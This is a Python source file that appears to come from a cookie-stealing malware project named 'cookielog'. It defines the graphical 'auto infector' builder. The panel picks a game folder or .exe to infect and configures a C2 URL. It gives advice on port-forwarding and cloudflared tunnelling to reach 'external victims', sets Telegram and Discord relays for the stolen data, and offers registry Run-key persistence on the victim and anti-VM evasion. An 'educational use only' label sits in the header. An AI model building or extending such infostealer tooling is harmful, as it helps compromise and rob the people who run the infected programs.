"""auto/gui.py — graphical picker extracted from auto.py.

Keeps auto.py focused on orchestration. All public names are re-exported
by auto.py so existing callers and tests keep working.
"""
import os
import sys

# Re-export dependencies that the GUI needs from auto.py's sibling modules.
from cklog.auto_config import load_config, save_config
from cklog.auto_network import detect_ip, _is_private_ip, detect_public_ip, find_best_port


def pick_gui(default_tunnel=False):
    """Open the graphical picker.

    Returns (path, mode, run, telegram, discord, persist, c2_url, no_anti_vm,
    tunnel). path is None when the dialog is cancelled.
    """
    try:
        import tkinter as tk
        from tkinter import filedialog, ttk
        import socket as _sock

        FONT = "Segoe UI"
        INFO = "#3a3a3a"
        OK = "#1a6b2f"
        WARN = "#a04400"

        root = tk.Tk()
        root.title("cookielog")
        root.geometry("700x650")
        root.resizable(False, False)

        style = ttk.Style()
        for theme in ("vista", "winnative", "clam", "default"):
            if theme in style.theme_names():
                style.theme_use(theme)
                break
        style.configure(".", font=(FONT, 9))
        style.configure("TButton", font=(FONT, 9), padding=(10, 4))
        style.configure("TLabelframe.Label", font=(FONT, 9, "bold"))

        result = {"path": None, "mode": None, "run": False,
                  "telegram": None, "discord": None, "persist": False,
                  "c2_url": None, "no_anti_vm": False, "tunnel": False}

        cfg = load_config()
        saved_port = cfg.get("port", 9090)

        c2_var = tk.StringVar()
        port_var = tk.StringVar(value=str(saved_port))
        avm_var = tk.BooleanVar(value=False)
        tunnel_var = tk.BooleanVar(value=bool(default_tunnel))
        tg_var = tk.StringVar(value=cfg.get("telegram", "") or "")
        dc_var = tk.StringVar(value=cfg.get("discord", "") or "")
        tg_enable = tk.BooleanVar(value=bool(cfg.get("telegram", "")))
        dc_enable = tk.BooleanVar(value=bool(cfg.get("discord", "")))
        persist_var = tk.BooleanVar(value=bool(cfg.get("persist", False)))

        def _port_value():
            raw = str(port_var.get()).strip()
            if not raw:
                return saved_port
            try:
                p = int(raw)
            except ValueError:
                return saved_port
            return p if 1 <= p <= 65535 else saved_port

        def _status(text, kind="info"):
            status_lbl.config(text=text,
                              foreground={"info": INFO, "ok": OK, "warn": WARN}[kind])

        def _find_best_port():
            _status("Scanning ports 9400-9500...")
            root.update()
            best = find_best_port(start=9400, end=9500, preferred=_port_value())
            if best is None:
                _status("No free port found in 9400-9500.", "warn")
                return
            port_var.set(str(best))
            _status("Port %d is free." % best, "ok")
            cur = c2_var.get().strip()
            if cur:
                try:
                    from auto import _rewrite_c2_port
                    c2_var.set(_rewrite_c2_port(cur, best))
                except ValueError:
                    pass

        def _detect_lan():
            ip = detect_ip()
            port = _port_value()
            c2_var.set("http://%s:%d/" % (ip, port))
            if _is_private_ip(ip):
                _status("C2 set to %s:%d (private address). External victims need "
                        "the public IP and a port-forward, or the tunnel." % (ip, port), "warn")
            else:
                _status("C2 set to %s:%d." % (ip, port), "ok")

        def _detect_public():
            _status("Looking up the public IP...")
            root.update()
            pub = detect_public_ip()
            if not pub:
                _status("Could not reach api.ipify.org. Check the connection.", "warn")
                return
            port = _port_value()
            c2_var.set("http://%s:%d/" % (pub, port))
            _status("C2 set to %s:%d. Port %d must be forwarded on the router."
                    % (pub, port, port), "ok")

        def _test_c2():
            url = c2_var.get().strip()
            if not url:
                _status("No C2 URL set.", "warn")
                return
            _status("Testing the C2...")
            root.update()
            try:
                from auto_network import check_c2_reachable
                ok, info = check_c2_reachable(url, timeout=3)
                if ok:
                    _status("C2 reachable (%s)." % info, "ok")
                else:
                    _status("C2 unreachable: %s" % str(info)[:80], "warn")
            except Exception as ex:
                _status("C2 test failed: %s" % str(ex)[:80], "warn")

        def do_folder():
            d = filedialog.askdirectory(title="Select game/app folder (contains the .exe)")
            if d:
                result["path"] = d
                result["mode"] = "folder"
                _save_and_close()

        def do_folder_run():
            d = filedialog.askdirectory(title="Select folder to infect AND run locally")
            if d:
                result["path"] = d
                result["mode"] = "folder"
                result["run"] = True
                _save_and_close()

        def do_file():
            f = filedialog.askopenfilename(
                title="Select standalone .exe to infect",
                filetypes=[("executables", "*.exe"), ("all files", "*.*")])
            if f:
                result["path"] = f
                result["mode"] = "file"
                _save_and_close()

        def do_file_run():
            f = filedialog.askopenfilename(
                title="Select .exe to infect AND run locally",
                filetypes=[("executables", "*.exe"), ("all files", "*.*")])
            if f:
                result["path"] = f
                result["mode"] = "file"
                result["run"] = True
                _save_and_close()

        def _collect_relay_values():
            tg_key = tg_var.get().strip()
            dc_key = dc_var.get().strip()
            tg = tg_key if (tg_enable.get() and tg_key) else None
            dc = dc_key if (dc_enable.get() and dc_key) else None
            return tg, dc, bool(persist_var.get())

        def _save_to_config():
            tg_key = tg_var.get().strip()
            dc_key = dc_var.get().strip()
            try:
                cfg_new = load_config()
                if tg_key:
                    cfg_new["telegram"] = tg_key
                if dc_key:
                    cfg_new["discord"] = dc_key
                cfg_new["persist"] = bool(persist_var.get())
                cfg_new["port"] = _port_value()
                save_config(cfg_new)
                verify = load_config()
                if tg_key and verify.get("telegram") != tg_key:
                    _status("Failed to save Telegram key to config.json.", "warn")
                    return False
                return True
            except Exception as ex:
                _status("Save failed: %s" % str(ex)[:80], "warn")
                return False

        def _save_and_close():
            _save_to_config()
            tg, dc, ps = _collect_relay_values()
            if tg:
                result["telegram"] = tg
            if dc:
                result["discord"] = dc
            result["persist"] = ps
            c2 = c2_var.get().strip()
            if c2:
                try:
                    from auto import _rewrite_c2_port
                    c2 = _rewrite_c2_port(c2, _port_value())
                except (ValueError, IndexError):
                    pass
                result["c2_url"] = c2
            result["no_anti_vm"] = bool(avm_var.get())
            result["tunnel"] = bool(tunnel_var.get())
            root.destroy()

        def save_relay():
            _save_to_config()
            _status("Relay settings saved to config.json.", "ok")

        # --- header ---
        header = ttk.Frame(root, padding=(12, 10, 12, 6))
        header.pack(fill="x")
        ttk.Label(header, text="cookielog",
                  font=(FONT, 14, "bold")).pack(side="left")
        ttk.Label(header, text="auto infector",
                  foreground="#666666").pack(side="left", padx=(8, 0), pady=(4, 0))
        ttk.Label(header, text="educational use only",
                  font=(FONT, 8), foreground="#8a6d3b").pack(side="right", pady=(4, 0))

        # --- target ---
        target = ttk.LabelFrame(root, text="Target", padding=(10, 8, 10, 10))
        target.pack(fill="x", padx=12, pady=(0, 8))
        for c in (0, 1):
            target.columnconfigure(c, weight=1, uniform="btn")
        ttk.Button(target, text="Select folder...",
                   command=do_folder).grid(row=0, column=0, sticky="ew", padx=(0, 4), pady=(0, 4))
        ttk.Button(target, text="Select folder and run (test)",
                   command=do_folder_run).grid(row=0, column=1, sticky="ew", padx=(4, 0), pady=(0, 4))
        ttk.Button(target, text="Select .exe...",
                   command=do_file).grid(row=1, column=0, sticky="ew", padx=(0, 4))
        ttk.Button(target, text="Select .exe and run (test)",
                   command=do_file_run).grid(row=1, column=1, sticky="ew", padx=(4, 0))

        # --- C2 / transport ---
        c2 = ttk.LabelFrame(root, text="C2 and transport", padding=(10, 8, 10, 10))
        c2.pack(fill="x", padx=12, pady=(0, 8))

        url_row = ttk.Frame(c2)
        url_row.pack(fill="x")
        ttk.Label(url_row, text="C2 URL:").pack(side="left")
        ttk.Entry(url_row, textvariable=c2_var).pack(side="left", fill="x",
                                                      expand=True, padx=(6, 8))
        ttk.Button(url_row, text="Detect LAN", command=_detect_lan).pack(side="left")
        ttk.Button(url_row, text="Public IP", command=_detect_public).pack(side="left",
                                                                           padx=(6, 0))
        ttk.Button(url_row, text="Test", command=_test_c2).pack(side="left", padx=(6, 0))

        port_row = ttk.Frame(c2)
        port_row.pack(fill="x", pady=(6, 0))
        ttk.Label(port_row, text="Port:").pack(side="left")
        ttk.Entry(port_row, textvariable=port_var, width=7).pack(side="left", padx=(6, 0))
        ttk.Button(port_row, text="Find free port",
                   command=_find_best_port).pack(side="left", padx=(6, 0))

        tunnel_row = ttk.Frame(c2)
        tunnel_row.pack(fill="x", pady=(8, 0))
        ttk.Checkbutton(tunnel_row,
                        text="Tunnel HTTPS through cloudflared (no port-forward)",
                        variable=tunnel_var).pack(anchor="w")
        ttk.Label(tunnel_row,
                  text="The public https URL replaces the C2 URL above; cloudflared must be installed.",
                  font=(FONT, 8), foreground="#666666").pack(anchor="w", padx=(20, 0))

        # --- relays ---
        relay = ttk.LabelFrame(root, text="Relays (optional)", padding=(10, 8, 10, 10))
        relay.pack(fill="x", padx=12, pady=(0, 8))

        tg_row = ttk.Frame(relay)
        tg_row.pack(fill="x")
        ttk.Checkbutton(tg_row, text="Telegram",
                        variable=tg_enable).pack(side="left")
        tg_status_lbl = ttk.Label(tg_row, text="", font=(FONT, 8, "bold"))
        tg_status_lbl.pack(side="right")
        ttk.Entry(relay, textvariable=tg_var).pack(fill="x", pady=(2, 6))

        dc_row = ttk.Frame(relay)
        dc_row.pack(fill="x")
        ttk.Checkbutton(dc_row, text="Discord",
                        variable=dc_enable).pack(side="left")
        dc_status_lbl = ttk.Label(dc_row, text="", font=(FONT, 8, "bold"))
        dc_status_lbl.pack(side="right")
        ttk.Entry(relay, textvariable=dc_var).pack(fill="x", pady=(2, 6))

        save_row = ttk.Frame(relay)
        save_row.pack(fill="x")
        ttk.Button(save_row, text="Save relays",
                   command=save_relay).pack(side="left")
        ttk.Label(save_row, text="Telegram: bot_token:chat_id     Discord: webhook URL",
                  font=(FONT, 8), foreground="#666666").pack(side="left", padx=(10, 0))

        # --- options ---
        opts = ttk.LabelFrame(root, text="Options", padding=(10, 8, 10, 10))
        opts.pack(fill="x", padx=12, pady=(0, 8))
        ttk.Checkbutton(opts, text="Persistence (registry Run key on the victim)",
                        variable=persist_var).pack(side="left")
        ttk.Checkbutton(opts, text="Disable anti-VM checks (VM targets only)",
                        variable=avm_var).pack(side="left", padx=(18, 0))

        # --- Status + footer ---
        status_lbl = ttk.Label(root, text="", foreground=INFO)
        status_lbl.pack(fill="x", padx=12, pady=(0, 6))

        ttk.Separator(root, orient="horizontal").pack(fill="x", padx=12)
        footer = ttk.Frame(root, padding=(12, 8, 12, 10))
        footer.pack(fill="x")
        ttk.Button(footer, text="Cancel", command=root.destroy).pack(side="right")

        # --- Live status ---
        def _relay_state(label, var, enabled):
            if enabled.get() and var.get().strip():
                label.config(text="active", foreground=OK)
            elif var.get().strip():
                label.config(text="disabled", foreground="#666666")
            else:
                label.config(text="no key", foreground="#666666")

        def update_tg_status(*_):
            _relay_state(tg_status_lbl, tg_var, tg_enable)

        def update_dc_status(*_):
            _relay_state(dc_status_lbl, dc_var, dc_enable)

        tg_var.trace_add("write", update_tg_status)
        dc_var.trace_add("write", update_dc_status)
        tg_enable.trace_add("write", update_tg_status)
        dc_enable.trace_add("write", update_dc_status)
        update_tg_status()
        update_dc_status()

        c2_var.set("http://%s:%d/" % (detect_ip(), _port_value()))
        _status("Ready. Choose a target to build the payload.")

        root.mainloop()
        return (result["path"], result["mode"], result["run"],
                result.get("telegram"), result.get("discord"), result.get("persist", False),
                result.get("c2_url"), result.get("no_anti_vm", False),
                result.get("tunnel", False))
    except Exception as ex:
        import auto
        auto.log("[!] GUI not available (%s)" % ex)
        return None, None, False, None, None, False, None, False, False
